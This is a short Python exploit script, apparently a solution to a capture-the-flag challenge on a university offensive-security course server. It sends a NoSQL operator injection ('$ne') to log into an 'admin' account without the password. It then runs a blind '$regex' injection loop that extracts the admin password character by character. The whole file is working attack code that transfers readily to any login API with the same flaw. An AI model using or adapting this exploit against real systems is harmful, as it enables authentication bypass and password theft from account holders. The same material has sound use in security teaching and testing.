import requests
import string
import re

url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:10001/api/login"
headers = {"Content-Type": "application/json"}
cookies = {
    "CHALBROKER_USER_ID": "nam10102"
}

data = {"username": "admin", "password": {"$ne": "nam10102"}}
print(f"Sending request to {url} with data: {data}")
response = requests.post(url, json=data, headers=headers, cookies=cookies)

if response.status_code == 200:
    print(response.json())
    cookies = response.cookies
    cookies["CHALBROKER_USER_ID"] = "nam10102"
    print(f"Cookies: {cookies}")
else:
    print(f"Error: {response.status_code}, {response.text}")

leaked_password = ""
while True:
    status_code = -1
    last_char = " "
    for char in string.ascii_letters + string.digits + string.punctuation + " ":
        last_char = char
        data = {"username": "admin", "password": {"$regex": f"^{leaked_password}{re.escape(char)}"}}
        response = requests.post(url, json=data, headers=headers)
        status_code = response.status_code
        if status_code == 200:
            leaked_password += char
            print(response.json())
            print(f"Leaked password so far: {leaked_password}")
            break
    if status_code != 200 and last_char == " ":
        print("No more characters to leak.")
        break

